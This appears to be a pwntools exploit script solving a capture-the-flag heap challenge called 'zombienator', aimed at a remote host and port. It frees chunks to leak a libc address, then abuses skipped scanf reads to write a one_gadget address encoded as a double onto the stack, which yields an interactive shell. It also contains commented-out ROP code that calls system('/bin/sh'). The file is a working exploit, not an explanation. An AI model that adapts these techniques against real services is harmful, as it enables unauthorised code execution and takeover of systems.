#!/usr/bin/env python3

from pwn import *

exe = ELF("./zombienator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.63.224',52944)
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000193D
#           ''')

#input()
def create(size,idx):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b"Zombienator's tier: ",size)
    p.sendlineafter(b'Front line (0-4) or Back line (5-9): ',idx)


def free_(idx):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b"Zombienator's position: ",idx)

def display():
    p.sendlineafter(b'>> ',b'3')


for i in range(10):
    create(b'130',str(i).encode())
#input()
for i in range(10):
    free_(str(i).encode())
display()
p.recvuntil(b'[7]: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak - 0x219ce0
log.info(f"libc: {hex(libc.address)}")

one_gadget = libc.address + 0xebc85

payload = str(struct.unpack('d', p64(1))[0]).encode()
def fmt(payload):
    p.sendlineafter(b'Enter coordinates: ',str(struct.unpack('d', p64(payload))[0]))
p.sendlineafter(b'>> ',b'4')
p.sendlineafter(b'Number of attacks: ',b'36')
pop_rdi = libc.address + 0x000000000002a3e5
one_gadget = libc.address + 0xebc88
for i in range(35):
    p.sendlineafter(b'Enter coordinates: ',b'.')
input()

fmt(one_gadget)


#fmt(pop_rdi)
#fmt(next(libc.search(b'/bin/sh\x00')))
#fmt(pop_rdi+1)
#fmt(libc.sym.system)








p.interactive()
